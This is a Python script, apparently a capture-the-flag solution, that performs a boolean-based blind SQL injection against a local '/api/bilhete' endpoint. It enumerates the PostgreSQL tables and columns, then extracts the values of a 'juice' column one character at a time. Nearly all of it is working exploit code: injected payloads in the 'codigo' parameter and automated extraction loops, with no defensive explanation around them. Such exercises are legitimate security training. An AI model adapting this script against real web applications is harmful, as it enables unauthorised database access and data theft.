import requests

url = 'http://localhost/api/bilhete'
chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_"

# Determine number of tables
num_tables = 0
while True:
  num_tables += 1
  payload = f"A1\' AND (SELECT count(*) FROM information_schema.tables WHERE table_schema=\'public\')={num_tables}--"
  r = requests.get(url, params={"codigo": payload})
  if r.json().get("disponivel"):
      print(f"There are {num_tables} tables")
      break

# Determine length of table name and table name for each table
for offset in range(num_tables):
  # Determine length of table name
  nr = 1
  while True:
      payload = f"A1\' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=\'public\' ORDER BY table_name LIMIT 1 OFFSET {offset})={nr}--"
      r = requests.get(url, params={"codigo": payload})
      if r.json().get("disponivel"):
          print(f"Table at offset {offset} has length: {nr}")
          break
      nr += 1
  
  # Determine table name
  table_name = ""
  for i in range(nr):
      for c in chars:
           payload = f"A1\' AND (SELECT SUBSTRING(table_name, {i+1}, 1) FROM information_schema.tables WHERE table_schema=\'public\' ORDER BY table_name LIMIT 1 OFFSET {offset})=\'{c}\'--"
           r = requests.get(url, params={"codigo": payload})
           if r.json().get("disponivel"):
               table_name += c
               break
  print(f"Table at offset {offset} has name: {table_name}")


# After running the above code, we find that there are 2 tables, one of which is "unsuspecting_table". We can then target this table to find out more information about it.
target_table = "unsuspecting_table"
# Determine number of columns
num_columns = 0
while True:
  num_columns += 1
  payload = f"A1\' AND (SELECT count(*) FROM information_schema.columns WHERE table_name=\'{target_table}\')={num_columns}--"
  r = requests.get(url, params={"codigo": payload})
  if r.json().get("disponivel"):
      print(f"There are {num_columns} columns in {target_table}")
      break
# Determine length of column name and column name for each column
for offset in range(num_columns):
  # Determine length of column name
  nr = 1
  while True:
      payload = f"A1\' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name=\'{target_table}\' ORDER BY column_name LIMIT 1 OFFSET {offset})={nr}--"
      r = requests.get(url, params={"codigo": payload})
      if r.json().get("disponivel"):
          print(f"Column at offset {offset} has length: {nr}")
          break
      nr += 1
  
  # Determine column name
  column_name = ""
  for i in range(nr):
      for c in chars:
           payload = f"A1\' AND (SELECT SUBSTRING(column_name, {i+1}, 1) FROM information_schema.columns WHERE table_name=\'{target_table}\' ORDER BY column_name LIMIT 1 OFFSET {offset})=\'{c}\'--"
           r = requests.get(url, params={"codigo": payload})
           if r.json().get("disponivel"):
               column_name += c
               break
  print(f"Column at offset {offset} has name: {column_name}")

# After running the above code, we find that there are 3 columns in the "unsuspecting_table", one of which is "juice". We can then target this column to find out more information about it.
# Determine values in the "juice" column
target_column = "juice"
# Determine number of rows
num_rows = 0
while True:
  num_rows += 1
  payload = f"A1\' AND (SELECT count(*) FROM {target_table})={num_rows}--"
  r = requests.get(url, params={"codigo": payload})
  if r.json().get("disponivel"):
      print(f"There are {num_rows} rows in {target_table}")
      break
# Determine value of "juice" column for each row
for offset in range(num_rows):
  value = ""
  for i in range(50): # Assuming max length of value is 50
      for c in chars:
           payload = f"A1\' AND (SELECT SUBSTRING({target_column}, {i+1}, 1) FROM {target_table} ORDER BY {target_column} LIMIT 1 OFFSET {offset})=\'{c}\'--"
           r = requests.get(url, params={"codigo": payload})
           if r.json().get("disponivel"):
               value += c
               break
  print(f"Value of {target_column} column at offset {offset} is: {value}")
